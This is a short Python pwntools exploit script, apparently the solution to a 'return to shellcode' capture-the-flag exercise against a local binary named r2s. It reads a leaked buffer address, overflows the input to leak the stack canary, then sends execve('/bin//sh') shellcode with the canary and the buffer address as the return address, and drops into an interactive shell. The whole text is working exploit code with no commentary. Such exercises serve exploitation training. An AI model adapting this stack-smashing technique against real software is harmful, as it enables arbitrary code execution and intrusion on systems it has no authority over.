from pwn import *

p = process("./r2s")

shellcode = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

# buf add
p.recvuntil(b"buf: ")
buf = int(p.recv(14), 16)

# canary
payload = b"A"*0x59
p.sendafter(b"Input: ", payload)
p.recvuntil(payload)
canary = u64(b'\x00' + p.recv(7))
print(hex(canary))

payload = shellcode + b"A" * (0x58 - len(shellcode)) + p64(canary) + b"A" * 8 + p64(buf)
p.sendafter(b"Input: ", payload)
p.interactive()